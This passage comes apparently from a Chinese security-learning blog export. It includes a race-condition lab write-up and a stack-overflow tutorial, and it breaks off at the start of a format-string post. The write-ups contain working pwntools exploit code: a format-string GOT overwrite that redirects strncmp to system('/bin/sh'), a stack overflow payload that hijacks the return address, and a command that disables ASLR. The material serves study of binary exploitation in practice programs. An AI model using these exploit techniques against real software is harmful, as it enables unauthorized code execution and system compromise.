<ul>
<li>在strcpy前断下，栈情况如下，从图中可以看到，此时share_buf中有<code>0x30</code>个a，而我们的目的是要将展示<code>0xf</code>覆盖为<code>0</code>；  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210028.png" style="zoom:40%;"></li>
<li>执行strcpy之后对比发现，n的位置已经被strcpy结尾的<code>\x00</code>覆盖为了<code>0</code>，这样在调用strncmp的时候，比较长度就是<code>0</code>，返回值也一定为<code>0</code>，直接绕过password的check拿到shell；  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210341.png" style="zoom:40%;"></li>
<li>程序最后输出“Welcome administrator!” 字样，证明这里成功的绕过了登陆验证，可以执行shell命令；  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210601.png" style="zoom:40%;"></li>
</ul>
</li>
</ol>
<h2 id="条件竞争漏洞示例2分析"><a href="#条件竞争漏洞示例2分析" class="headerlink" title="条件竞争漏洞示例2分析"></a>条件竞争漏洞示例2分析</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><ol>
<li><p>将程序放入IDA中，找到main函数，对main函数进行反汇编代码如下，函数功能简单，用于保存某个用户的name和life_creed，用户可以通过输入命令来进行更改这两个属性的值，也可以通过命令查看、退出等，具体流程如下：</p>
<ol>
<li> 命令1：输入name和life_creed信息</li>
<li> 命令2：生成一个线程，用于修改name的值</li>
<li> 命令3：生成一个线程，用于修改life_creed的值</li>
<li> 命令4：显示name和life_creed的值</li>
<li> 命令5：退出程序</li>
</ol>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095405.png" style="zoom:50%;"></li>
<li><p>分析子函数功能</p>
<ol>
<li><p><code>sub_400AA3()</code>函数——初始化信息；</p>
<p> 输出一串信息，输入一个命令执行响应的函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095603.png" style="zoom:50%;"></li>
<li><p><code>sub_400B69()</code>函数——输入name和life_creed信息</p>
<p> 此过程没有进行特殊字符的检查，也没有进行strcpy()或strcmp()等敏感操作；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095713.png" style="zoom:50%;"></li>
<li><p><code>start_routine(void *a1)</code>函数——修改name的线程函数</p>
<p> 此过程也没有进行上述敏感操作或sleep()操作，暂未找到可利用的地方；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100210.png" style="zoom:50%;"></li>
<li><p><code>sub_400CE1(void *a1)</code>函数——修改life_creed的线程函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100504.png" style="zoom:60%;">

<p> 此过程可以看到图中红色部分的子函数<code>sub_400BDA(&amp;buf, &amp;buf)</code>，对此函数进行反编译，可见其功能是对输入的字符进行检查，如果遇到特殊字符<code>%</code>、<code>$</code>就终止程序，此过程过滤了格式化字符串漏洞；</p>
<p> 注意到蓝色框线内的strncpy函数，限制了长度，但是将buf字符串复制到dest字符串中，而dest字符串是全局变量，满足了条件竞争中的其中一个条件“共享对象”；</p>
<p> 其中对life_creed在命令1和3中都进行了对dest修改，也满足了条件“改变对象”；</p>
<p> 注意到绿色框线内有sleep 3秒钟，和主线程可以一起执行此子线程，满足了条件竞争的其中一个条件“并发”；</p>
<p> 注意到黑色框线内的printf(dest)；联想到格式化字符串漏洞；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100758.png" style="zoom:50%;"></li>
<li><p><code>sub_400DD0()</code>函数——信息输出函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101107.png" style="zoom:60%;"></li>
<li><p><code>sub_400E13()</code>函数——程序退出函数</p>
<p> 此处判断是否对此game满意，输入yes才会退出，否则继续游戏；</p>
<p> 注意到下图的strncmp函数，此函数第一个参数为buf，没有进行敏感字符检查，想到可以将strncmp函数的got表地址修改为system函数的地址，进而buf中直接输入<code>/bin/sh</code>即可拿到shell权限；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101232.png" style="zoom:60%;"></li>
</ol>
</li>
<li><p>关于64位程序的参数存放</p>
<ol>
<li><p>使用gdb调试程序，设置断点，并不能在main函数设置断点，在printf设置断点；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101534.png" style="zoom:50%;"></li>
<li><p>在运行到<code>printf(dest)</code>时，看到如下信息</p>
<p> 64位的格式化字符串漏洞的利用方式和32位的不同，32位的参数都是按照栈直接存储查找的，而64位的参数会先放到寄存器里，也就是说format不管多长，都只是存到下面的<strong>RDI寄存器</strong>内，可以理解为第0个参数，其余的参数存放到剩下的5个寄存器内。而ESP的指针即栈顶为第六个参数。所以再利用格式化字符串漏洞时需要先覆盖栈内的内容，再根据format查找参数进行覆写。</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226102809.png" style="zoom:50%;"></li>
</ol>
</li>
</ol>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>根据上述分析，漏洞的利用思路可以分为以下几个步骤：</p>
<ol>
<li> 获取strncmp函数地址和system函数地址；</li>
<li> 输入命令3，输入strncmp的got表的地址到buf，buf的值会存到栈上，buf将复制到dest里，并通过了检查，进入sleep；</li>
<li> 输入命令1，将dest替换为格式化字符串，修改strncmp的got表地址为system函数的地址；</li>
<li> 此时输入命令5，strncmp函数变为system函数地址，buf为第一个参数，输入<code>/bin/sh</code>时，相当于执行<code>system('/bin/sh')</code>；</li>
</ol>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
<li><p>获取strncmp函数地址和system函数地址</p>
<ol>
<li><p>通过gdb调试，在<code>0x400E13</code>（ida中的地址）处设置断点，顺序执行到strncmp函数如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103552.png" style="zoom:50%;"></li>
<li><p>查看<code>0x400890</code>处的汇编指令，即可得到strncmp函数的got表地址为<code>0x602028</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103704.png" style="zoom:50%;"></li>
<li><p>获取system函数的地址可以采用根据puts函数地址的偏移来获取，关闭地址随机化后，system函数的地址是固定的，直接print即可得到system的地址为<code>0x7ffff7812550</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103815.png" style="zoom:50%;">

<p> 临时关闭地址随机化指令</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>输入命令3，修改栈上内容为strncmp的got表地址并通过检查</p>
<ol>
<li><p> strncmp的got表的地址为<code>0x602028</code>，由于是64位可执行程序，格式化字符串每次可以将2字节数据写入内存，此处要写8次，所以应该在栈上写上从地址<code>0x602028~0x60202f</code>，一共八个地址；</p>
</li>
<li><p>写一个循环，将这八个地址拼接起来，python代码如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strncmp_addr</span>(<span class="params">strncmp_got</span>):</span><br><span class="line">    addr_part = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	addr_part += p64(strncmp_got + i)</span><br><span class="line">    <span class="keyword">return</span> addr_part</span><br></pre></td></tr></table></figure></li>
<li><p>修改栈上内容为strncmp的got表地址并通过检查的代码如下;</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># overwrite stack with strncmp' got_addr and pass the check</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your new life_creed: '</span>)</span><br><span class="line">p.sendline(strncmp_addr(strncmp_got))</span><br></pre></td></tr></table></figure></li>
<li><p>在<code>0x400CE1</code>设置断点，查看被覆写后的栈的情况；</p>
<p> 下图显示的栈内的红色区域即被写入strncmp函数的got表的地址，从<code>0x602028~0x60202f</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226105719.png" style="zoom:50%;"></li>
</ol>
</li>
<li><p>输入命令1，输入格式化字符串并修改strncmp地址为system</p>
<ol>
<li><p>构造格式化字符串，同上分析，需要覆写8次，而由于64位函数的参数先保存在寄存器内，再从栈上寻找，栈顶的参数恰好为printf的第6个参数，所以覆写八次，参数分别为6-13个参数，所以generate_format函数如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_format</span>(<span class="params">value</span>):</span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    print_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span> * i)) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        one_byte = (value &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span></span><br><span class="line">        payload += <span class="string">'%{0}c%{1}$hhn'</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">6</span> + i)</span><br><span class="line">        print_count += (one_byte - print_count) % <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure></li>
<li><p>输入格式化字符串并修改strncmp地址为system地址的代码如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = <span class="number">0x7ffff7835390</span></span><br><span class="line"><span class="comment"># replace 'life_creed' with format string</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'yourname'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'life_creed: '</span>)</span><br><span class="line">p.sendline(generate_format(system_addr))</span><br></pre></td></tr></table></figure></li>
<li><p>等待3秒，上一个线程就会执行printf(dest)，从而将got表中strncmp地址修改为system函数的地址；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>在命令5处，即<code>0x400E13</code>处设置断点，查看此时got表中strncmp函数的内容，strncmp函数的内容被覆盖为system函数的地址，即<code>0x7ffff7812550</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226110328.png" style="zoom:50%;"></li>
</ol>
</li>
<li><p>执行<code>system('/bin/sh')</code></p>
<ol>
<li><p>此时GOT表中strncmp地址已被覆写为system地址，在buf中输入<code>/bin/sh</code>，执行到strncmp函数时，第一个参数即为buf，相当于执行<code>system('/bin/sh')</code>，最后代码如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Are you satisfied with this game?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>运行编写的python代码，成功拿到shell权限；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226113152.png" style="zoom:50%;"></li>
</ol>
</li>
</ol>
<p>备注：<a href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>条件竞争漏洞</tag>
        <tag>进程</tag>
        <tag>线程</tag>
        <tag>协程</tag>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制-栈溢出漏洞</title>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="寄存器基础"><a href="#寄存器基础" class="headerlink" title="寄存器基础"></a>寄存器基础</h2><h3 id="数据寄存器-通用寄存器"><a href="#数据寄存器-通用寄存器" class="headerlink" title="数据寄存器(通用寄存器)"></a>数据寄存器(通用寄存器)</h3><p>主要用来保存操作数和运算结果；<span id="more"></span></p>
<ul>
<li>  64位:RAX、RBX、RCX、RDX</li>
<li>  32位:EAX、EBX、ECX、EDX</li>
<li>  16位:AX、BX、CX、DX</li>
</ul>
<h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>主要用于存放存储单元在段内的偏移量；</p>
<ul>
<li>  64位:RSI、RDI</li>
<li>  32位:ESI、EDI</li>
<li>  16位:SI、DI</li>
</ul>
<h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>主要用于存放堆栈内存储单元的偏移量，用它们可实现多种存储器操作数的寻址方式；</p>
<ul>
<li>  64位:RBP、RSP</li>
<li>  32位:EBP、ESP</li>
<li>  16位:BP、SP</li>
</ul>
<p>标注：</p>
<ul>
<li>  BP为基指针(BasePointer)寄存器，用它可直接存取堆栈中的数据；</li>
<li>  SP为堆栈指针(StackPointer)寄存器，用它只可访问栈顶；</li>
</ul>
<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>段寄存器是根据内存分段的管理模式而设置的；</p>
<p>内存单元的物理地址由段寄存器的值和一个偏移量值组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址；</p>
<ul>
<li>  CS代码段寄存器(CodeSegmentRegister)，其值为代码段的段值；</li>
<li>  DS数据段寄存器(DataSegmentRegister)，其值为数据段的段值；</li>
<li>  ES附加段寄存器(ExtraSegmentRegister)，其值为附加数据段段值；</li>
<li>  SS堆栈段寄存器(StackSegmentRegister)，其值为堆栈段的段值；</li>
<li>  FS附加段寄存器(ExtraSegmentRegister)，其值为附加数据段的段值；</li>
<li>  GS附加段寄存器(ExtraSegmentRegister)，其值为附加数据段的段值；</li>
</ul>
<h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p>存放下次将要执行的指令所在代码段的偏移量；</p>
<ul>
<li>  64位:RIP</li>
<li>  32位:EIP</li>
<li>  16位:IP</li>
</ul>
<h2 id="栈基础"><a href="#栈基础" class="headerlink" title="栈基础"></a>栈基础</h2><h3 id="函数与函数栈"><a href="#函数与函数栈" class="headerlink" title="函数与函数栈"></a>函数与函数栈</h3><ul>
<li>  栈是一种先进后出的特殊数据结构，用于存储程序在运行时的临时数据和地址，用于支撑函数的运行和嵌套调用；</li>
<li>  栈的分配是由程序编译时确定下来的，无法由程序员控制；</li>
<li>  栈中存储着线程或者进程的局部变量；</li>
<li>  不同的进程或线程的栈处于不同的位置，在程序正常运行时不同线程和进程之间不能互相访问彼此的栈地址；</li>
</ul>
<h3 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p>以64位程序执行call指令为例，在执行call指令的时候，会向栈中压入call指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164805.png" style="zoom:25%;">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rbp	;将父函数栈底压入栈中</span><br><span class="line">mov rbp, rsp	;将父函数栈顶变为子函数栈底</span><br><span class="line">sub rsp, 0x70	;抬高栈顶为子函数开辟栈帧</span><br></pre></td></tr></table></figure>

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164850.png" style="zoom:25%;">

<p>在函数调用结束时，会执行如下两条指令；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203170920.png" style="zoom:25%;">

<ul>
<li><p>其中leave指令相当于执行了如下指令，相当于将ebp和esp两个指针恢复到函数被调用前；</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure></li>
<li><p>  ret指令相当于将栈中的返回地址pop给rip的操作，从而回到父函数继续执行；</p>
</li>
</ul>
<h3 id="函数传递参数"><a href="#函数传递参数" class="headerlink" title="函数传递参数"></a>函数传递参数</h3><p>函数都要通过传递进去的参数来确定其具体的工作内容，而函数间的参数也是通过栈来传递的；</p>
<p>以如下程序为例，学习32位程序和64位程序的参数传递过程的区别；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>{</span><br><span class="line">    <span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(“%d %d\n”,x,y); </span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    foo(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li><p>32位程序</p>
<ul>
<li><p>函数需要传递的参数是直接被压入栈中的的方式，即直接写在栈上；</p>
<ul>
<li>  ebp的下方依此是父函数的栈底地址，程序返回地址，传递的参数1，传递的参数2，…；</li>
<li>  由于在函数调用前通过push指令向栈中压入了数据，使得栈顶被抬高了；</li>
<li>  在函数调用结束以后，将通过add esp 0x10这条指令，即增加esp来恢复函数调用前的esp；</li>
</ul>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203174218.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p>64位程序</p>
<ul>
<li><p>  传递的参数不再直接写在栈上，而是通过寄存器传递；</p>
</li>
<li><p>  这些寄存器分别是rdi、rsi、rdx、rcx、r8、r9，超出寄 存器存放数量的数据才继续在栈上存储；</p>
</li>
<li><p>64位程序反汇编结果如下；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164805.png" style="zoom:25%;"></li>
<li><p>  函数传递参数不再向栈中压入，而是将参数赋值给edi和esi，由于没有压栈的操作，所以函数执行结束以后也就没有相应的恢复栈顶的过程；</p>
</li>
</ul>
</li>
</ul>
<p>栈中数据调用分析如下：</p>
<ul>
<li>函数可以调用的栈上的参数主要分为两部分:传递的参数和程序里的局部变量；<ul>
<li>  这里的printf函数的两个参数分别是父函数传递过去的第一个参数和第二个参数；</li>
<li>  最上边的mov指令的参数就是局部变量:代码中的数组a；</li>
</ul>
</li>
<li>  不论是函数的参数还是局部变量，都是通过统一的方式:<strong>栈底指针+偏移量</strong>来读取；</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203174411.png" style="zoom:25%;">

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203173509.png" style="zoom:25%;">

<h1 id="栈溢出漏洞原理"><a href="#栈溢出漏洞原理" class="headerlink" title="栈溢出漏洞原理"></a>栈溢出漏洞原理</h1><h2 id="栈溢出产生的原因"><a href="#栈溢出产生的原因" class="headerlink" title="栈溢出产生的原因"></a>栈溢出产生的原因</h2><ul>
<li>  编写代码时，对于数组和字符串等变量的边界没有进行足够的检测；</li>
<li>栈溢出漏洞的产生总会伴随着以下两个事件：<ul>
<li>  程序向栈上写入一组数据；</li>
<li>  写入的数据总长度没有进行有效的检测；</li>
</ul>
</li>
<li>  栈溢出导致攻击者可以通过向其中写入过多的数据，从而覆盖掉栈上的其它变量和原本不能访问到的地址，如返回地址等；</li>
</ul>
<h2 id="栈溢出的危害"><a href="#栈溢出的危害" class="headerlink" title="栈溢出的危害"></a>栈溢出的危害</h2><ul>
<li>  修改父函数栈底地址</li>
<li>  修改返回地址</li>
<li>  修改SEH链表地址</li>
</ul>
<h1 id="栈溢出漏洞分析"><a href="#栈溢出漏洞分析" class="headerlink" title="栈溢出漏洞分析"></a>栈溢出漏洞分析</h1><p>以如下程序为例进行漏洞分析；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* stack_overflow */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hackhere</span><span class="params">()</span>{</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Congratulations! You hacked me now.\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span>{</span><br><span class="line">    print(<span class="string">"Wrong!!!\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">char</span> username[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your username:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,username);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(username)==<span class="number">4</span> &amp;&amp; !<span class="built_in">strcmp</span>(username,<span class="string">"admin"</span>)){</span><br><span class="line">		hackhere();</span><br><span class="line">    } </span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">		foo();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><ul>
<li>  程序第12行，在正常的流程下，无法或很难找到一个满足if语句的条件:长度为4而且与 <code>admin</code>相同的字符串；</li>
<li>  通过观察程序流程发现，<code>main</code>函数中在栈上申请了一个名为<code>username</code>的字符串；</li>
<li>  在读取该字符串的时候对于读入的长度没有进行检测，导致可以通过<code>scanf</code>函数向栈上写入超过<code>username</code>本身长度的字符串从而造成<strong>栈溢出</strong>；</li>
</ul>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>扔进IDA，进行静态反汇编，找到<code>hackhere</code>函数的地址<code>0x4005F7</code>和<code>main</code>函数的执行结束前的地址<code>0x400692</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135142.png" style="zoom:25.5%;">

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135245.png" style="zoom:25%;"></li>
<li><p>反汇编<code>main</code>函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135339.png" style="zoom:50%;"></li>
<li><p>分析</p>
<ol>
<li> <code>username</code>后面的变量声明注释表明<code>username</code>与rbp之间相差了<code>0x0A</code>个字符；</li>
<li> 写入<code>0x0A</code>个字符之后就能覆盖掉rbp所指向的父函数栈底地址；</li>
<li> 想要覆盖rbp所指向的父函数栈底地址下方的函数返回地址，只需要填充<code>0x0A+0x08=0x12</code>个字符后修改即可；</li>
</ol>
</li>
<li><p>构造payload如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./stack_overflow'</span>)</span><br><span class="line">hackhere = p64(<span class="number">0x4005F7</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x0A</span> + <span class="number">0x8</span>) + hackhere</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul>
<li><p>gdb调试攻击代码；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211147.png" style="zoom:25%;"></li>
<li><p>继续运行，直到代码停在之前设置的断点<code>0x400692</code>处，可以发现rbp和rsp的地址所指的内容已经被覆盖了；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211344.png" style="zoom:25%;"></li>
<li><p>接下来使用<code>x /20x 0x7ffeb89a0128</code>指令查看栈底的返回地址，此时栈底的返回地址已经被修改成0x400626，即hackhere函数的地址了；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211514.png" style="zoom:25%;"></li>
<li><p>继续运行程序，发现程序结束，打印出<code>Congratulations!You hacked me now</code>，证明栈溢出漏洞利用成功；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211651.png" style="zoom:25%;"></li>
</ul>
<p>备注：<a href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
        <tag>寄存器</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制-格式化字符串漏洞</title>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%20%E4%B8%8B%E5%8D%881.44.18.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>格式化字符串漏洞是广泛存在于基于C/C++的可执行文件中的漏洞，是典型的二进制常见漏洞之一，其危害甚至超过了缓冲区溢出；</p>
<span id="more"></span>

<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。</p>
<h2 id="格式化输出函数"><a href="#格式化输出函数" class="headerlink" title="格式化输出函数"></a>格式化输出函数</h2><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><ul>
<li>  功能：向stdout按规定的格式输出信息；</li>
<li>格式：<code>int printf (const char *format,[argument]...)</code><ul>
<li>  format是格式控制字符串，其他参数为输出项；</li>
<li>  <code>printf("Id=%d",Id);</code></li>
</ul>
</li>
</ul>
<h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h3><ul>
<li>  功能：把格式化的数据写入某个字符串中；</li>
<li>格式：<code>int sprintf(char *buffer,const char *format,[argument]...)</code><ul>
<li>  buffer是要写入字符串的缓冲区；</li>
<li>  函数按照第二部分格式化字符的格式，把第三部分的数据进行格式化，然后在把格式化后的数据类型，存储到字符串的缓存区间里去；</li>
<li>  <code>sprintf(buffer, "Id=%d", Id);</code></li>
</ul>
</li>
</ul>
<h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><ul>
<li>  功能：把格式化的数据写入某个字符串中，控制字符串长度；</li>
<li>格式：<code>int snprintf(char *str,size_t size,const char *format,[argument]...)</code><ul>
<li>  在sprintf的基础上限制了可写入字符的最大值size；</li>
<li>  当格式化后的字符串长度&lt;size，则将字符串全部复制到str中，并在最后添加字符串结束符<code>\0</code>；当格式化后的字符串长度&gt;=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符<code>\0</code>；</li>
<li>  <code>sprintf(buffer, 10,"Id=%d", Id);</code></li>
</ul>
</li>
</ul>
<h3 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf"></a>fprintf</h3><ul>
<li>  功能：用于格式化输出到一个流/文件中；</li>
<li>格式：<code>int fprintf(FILE *stream,const char *format,[argument]...)</code><ul>
<li>  根据指定的格式控制字符串format向输出流stream中写入数据；</li>
<li>  当stream为stdout时，fprintf与printf的功能相同；</li>
<li>   <code>printf(pfile,"Id=%d",Id);</code></li>
</ul>
</li>
</ul>
<h3 id="vprintf-vsprintf-vsnprintf-vfprintf"><a href="#vprintf-vsprintf-vsnprintf-vfprintf" class="headerlink" title="vprintf/vsprintf/vsnprintf/vfprintf"></a>vprintf/vsprintf/vsnprintf/vfprintf</h3><ul>
<li>  功能分别对应于printf/sprintf/snprintf/fprintf；</li>
<li>  将变参列表换成了va_list类型的参数</li>
<li>格式：<ul>
<li>  <code>vprintf (format,va_list);</code></li>
<li>  <code>vsprintf (buffer,format,va_list);</code></li>
<li>  <code>vsnprintf (buffer,256,format,va_list);</code></li>
<li>  <code>vfprintf(stream, format, va_list);</code></li>
</ul>
</li>
</ul>
<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ul>
<li><p>格式化字符串是由普通字符串和格式化规定字符构成的字符序列：</p>
<ul>
<li>  普通字符被原封不动地复制到输出流中；</li>
<li>  格式化规定字符则是以<code>%</code>开始，用来确定输出内容格式；</li>
</ul>
</li>
<li><p>基本格式</p>
<p>  <code>%[parameter][flags][fieldwidth][.precision][length]type</code></p>
<ul>
<li><p>parameter</p>
<ul>
